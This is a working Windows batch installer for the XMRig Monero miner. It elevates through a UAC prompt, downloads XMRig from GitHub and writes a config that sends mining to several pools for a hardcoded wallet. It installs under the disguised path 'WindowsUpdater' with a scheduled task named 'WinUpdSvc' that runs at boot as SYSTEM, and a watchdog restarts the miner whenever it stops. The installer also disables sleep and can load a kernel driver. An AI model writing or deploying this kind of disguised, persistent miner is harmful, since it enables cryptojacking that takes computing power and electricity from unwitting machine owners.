@echo off
REM Force the window to be visible
title Monero Miner Setup - High-End PC
color 0A

REM ====================================================================
REM Ultimate Monero Miner - High-End Edition (MSR Fixed, Enhanced)
REM Optimized for modern multi-core CPUs with 16GB+ RAM
REM Installs to C:\ProgramData\WindowsUpdater as requested
REM ====================================================================
setlocal enableextensions enabledelayedexpansion

REM === Debug Logging ===
echo [*] Script started at %date% %time% > "%temp%\miner_debug.log"
echo [*] Running as user: %username% >> "%temp%\miner_debug.log"

REM === CONFIGURATION ===
set "SRC=%~dp0miner_src"
set "DEST=C:\ProgramData\WindowsUpdater"
set "TASK_NAME=WinUpdSvc"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "POOL=gulf.moneroocean.stream:10128"
set "LOG_FILE=%DEST%\miner.log"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"

REM === One-Time Admin Enforcement ===
echo [*] Checking for admin privileges...
echo [*] Checking for admin privileges... >> "%temp%\miner_debug.log"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo [!] Admin privileges not detected. Attempting to elevate...
    echo [!] Admin privileges not detected. Attempting to elevate... >> "%temp%\miner_debug.log"
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs"
    exit /b
)
echo [✔] Running with admin privileges.
echo [✔] Running with admin privileges. >> "%temp%\miner_debug.log"

echo ===============================
echo Starting Monero Miner on High-End PC
echo ===============================

REM === Debug Pause ===
echo [*] Initial setup complete. Press any key to continue...
pause

REM === Clean Up Existing Task (If Any) ===
echo [*] Cleaning up existing scheduled task (if any)...
echo [*] Cleaning up existing scheduled task (if any)... >> "%temp%\miner_debug.log"
schtasks /delete /tn "%TASK_NAME%" /f
echo [✔] Scheduled task cleanup complete. >> "%temp%\miner_debug.log"

REM === MSR Driver Installation (With Fallback) ===
echo [*] Attempting to install MSR driver for performance boost...
echo [*] Attempting to install MSR driver for performance boost... >> "%temp%\miner_debug.log"
if exist "%DEST%\miner_src\winring0x64.sys" (
    sc create WinRing0_1_2_0 binPath= "%DEST%\miner_src\winring0x64.sys" type= kernel start= demand
    sc start WinRing0_1_2_0
    if '%errorlevel%' neq '0' (
        echo [!] Failed to install MSR driver. Continuing without it...
        echo [!] Failed to install MSR driver. Continuing without it... >> "%temp%\miner_debug.log"
    ) else (
        echo [✔] MSR driver installed successfully.
        echo [✔] MSR driver installed successfully. >> "%temp%\miner_debug.log"
    )
) else (
    echo [!] WinRing0x64.sys not found. Continuing without MSR tweaks...
    echo [!] WinRing0x64.sys not found. Continuing without MSR tweaks... >> "%temp%\miner_debug.log"
)

REM === System Optimization ===
echo [*] Applying system optimizations...
echo [*] Applying system optimizations... >> "%temp%\miner_debug.log"
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /hibernate off
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCIDLE 0
powercfg /setactive SCHEME_CURRENT
echo [✔] System optimizations applied. >> "%temp%\miner_debug.log"

REM === CPU Core Detection ===
set "AFFINITY_MASK="
for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "="') do (
    set /a "CORES=%%A"
    set /a "AFFINITY_MASK=(1<<%%A)-1"
)
if not defined AFFINITY_MASK (
    set "AFFINITY_MASK=255"  REM Fallback for 8 cores
)
echo [*] CPU Affinity set to: !AFFINITY_MASK! >> "%temp%\miner_debug.log"

REM === Auto-Update Miner ===
echo [*] Checking for XMRig updates...
echo [*] Checking for XMRig updates... >> "%temp%\miner_debug.log"
set "URL="
for /f "delims=" %%A in ('powershell -NoProfile -Command ^
  "try {$r=Invoke-RestMethod -Uri '%GITHUB_API%' -UseBasicParsing -ErrorAction Stop;$a=$r.assets^|?{$_.name-match'win64.*msvc.*zip'}^|Select -First 1;if($a){$a.browser_download_url}else{''}}"') do set "URL=%%A"

if defined URL (
    echo [+] Downloading update...
    echo [+] Downloading update... >> "%temp%\miner_debug.log"
    powershell -Command "try {IWR -Uri '%URL%' -OutFile '%TEMP%\xmrig.zip' -UseBasicParsing -ErrorAction Stop} catch {Write-Output 'Download failed: '+$_.Exception.Message; exit 1}" 2>> "%temp%\miner_debug.log"
    if '%errorlevel%' equ '0' (
        if exist "%TEMP%\xmrig.zip" (
            if not exist "%SRC%" mkdir "%SRC%"
            powershell -Command "try {Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force -ErrorAction Stop} catch {Write-Output 'Extraction failed: '+$_.Exception.Message; exit 1}" 2>> "%temp%\miner_debug.log"
            if '%errorlevel%' equ '0' (
                del "%TEMP%\xmrig.zip"
                echo [✔] Update downloaded and extracted. >> "%temp%\miner_debug.log"
            ) else (
                echo [!] Failed to extract update. Continuing with existing files... >> "%temp%\miner_debug.log"
            )
        ) else (
            echo [!] Downloaded file not found. Continuing with existing files... >> "%temp%\miner_debug.log"
        )
    ) else (
        echo [!] Failed to download update. Continuing with existing files... >> "%temp%\miner_debug.log"
    )
) else (
    echo [!] Failed to retrieve update URL. Continuing with existing files... >> "%temp%\miner_debug.log"
)

REM === Install Files ===
echo [*] Installing files to %DEST%...
echo [*] Installing files to %DEST%... >> "%temp%\miner_debug.log"
if not exist "%DEST%" mkdir "%DEST%"
if not exist "%DEST%\miner_src" mkdir "%DEST%\miner_src"
xcopy /Y /Q "%SRC%\*" "%DEST%\miner_src\"
if '%errorlevel%' equ '0' (
    echo [✔] Files installed successfully. >> "%temp%\miner_debug.log"
) else (
    echo [!] File copy failed
    echo [!] File copy failed >> "%temp%\miner_debug.log"
    pause
    exit /b 1
)

REM === Generate Config File ===
echo [*] Generating config file...
echo [*] Generating config file... >> "%temp%\miner_debug.log"
(
  echo {
  echo   "autosave": true,
  echo   "cpu": {
  echo     "enabled": true,
  echo     "huge-pages": true,
  echo     "hw-aes": true,
  echo     "priority": 3,
  echo     "memory-pool": true,
  echo     "asm": true,
  echo     "max-threads-hint": 85,
  echo     "affinity": !AFFINITY_MASK!
  echo   },
  echo   "opencl": false,
  echo   "cuda": false,
  echo   "pools": [
  echo     {
  echo       "url": "gulf.moneroocean.stream:10128",
  echo       "user": "%WALLET%",
  echo       "pass": "%COMPUTERNAME%",
  echo       "keepalive": true,
  echo       "tls": false,
  echo       "weight": 100
  echo     },
  echo     {
  echo       "url": "pool.supportxmr.com:5555",
  echo       "user": "%WALLET%",
  echo       "pass": "%COMPUTERNAME%",
  echo       "keepalive": true,
  echo       "tls": false,
  echo       "weight": 80
  echo     },
  echo     {
  echo       "url": "mine.moneroocean.stream:10032",
  echo       "user": "%WALLET%",
  echo       "pass": "%COMPUTERNAME%",
  echo       "keepalive": true,
  echo       "tls": false,
  echo       "weight": 60
  echo     },
  echo     {
  echo       "url": "pool.hashvault.pro:5555",
  echo       "user": "%WALLET%",
  echo       "pass": "%COMPUTERNAME%",
  echo       "keepalive": true,
  echo       "tls": false,
  echo       "weight": 40
  echo     }
  echo   ],
  echo   "retry-time": 10,
  echo   "retry-count": 3
  echo }
) > "%DEST%\config.json"
echo [✔] Config file generated. >> "%temp%\miner_debug.log"

REM === Clean Watchdog ===
echo [*] Creating watchdog script...
echo [*] Creating watchdog script... >> "%temp%\miner_debug.log"
(
  echo @echo off
  echo :loop
  echo REM Check if xmrig.exe is already running
  echo tasklist /fi "IMAGENAME eq xmrig.exe" 2^>nul ^| find /i "xmrig.exe" ^>nul
  echo if not errorlevel 1 (
  echo     REM xmrig.exe is running, wait and check again
  echo     ping 127.0.0.1 -n 11 ^>nul
  echo     goto loop
  echo )
  echo REM xmrig.exe is not running, start it
  echo start "" "%DEST%\miner_src\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages ^
       --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
  echo REM Wait before checking again
  echo ping 127.0.0.1 -n 11 ^>nul
  echo goto loop
) > "%DEST%\run_watchdog.bat"
echo [✔] Watchdog script created. >> "%temp%\miner_debug.log"

REM === Permanent Auto-Start ===
echo [*] Creating scheduled task to run on boot...
echo [*] Creating scheduled task to run on boot... >> "%temp%\miner_debug.log"
schtasks /create /tn "%TASK_NAME%" ^
  /tr "cmd /c start \"\" /min \"%DEST%\run_watchdog.bat\"" ^
  /sc onstart ^
  /ru SYSTEM ^
  /rl HIGHEST ^
  /f
if '%errorlevel%' equ '0' (
    echo [✔] Scheduled task created successfully.
    echo [✔] Scheduled task created successfully. >> "%temp%\miner_debug.log"
) else (
    echo [!] Failed to create scheduled task. Please ensure you are running as administrator.
    echo [!] Failed to create scheduled task. Please ensure you are running as administrator. >> "%temp%\miner_debug.log"
    pause
    exit /b 1
)

REM === Verify Scheduled Task ===
echo [*] Verifying scheduled task...
echo [*] Verifying scheduled task... >> "%temp%\miner_debug.log"
schtasks /query /tn "%TASK_NAME%"
if '%errorlevel%' equ '0' (
    echo [✔] Scheduled task verified.
    echo [✔] Scheduled task verified. >> "%temp%\miner_debug.log"
) else (
    echo [!] Scheduled task creation failed or task not found.
    echo [!] Scheduled task creation failed or task not found. >> "%temp%\miner_debug.log"
    pause
    exit /b 1
)

REM Start the watchdog (minimized)
start "" /min "%DEST%\run_watchdog.bat"

echo [✔] Miner installed (optimized for high-end PC)
echo CPU Affinity: !AFFINITY_MASK!
echo Logs: %LOG_FILE%
echo Uninstall: schtasks /delete /tn "%TASK_NAME%" /f ^>nul ^&^& rmdir /s /q "%DEST%"
echo [✔] Miner installed at %date% %time% >> "%temp%\miner_debug.log"
pause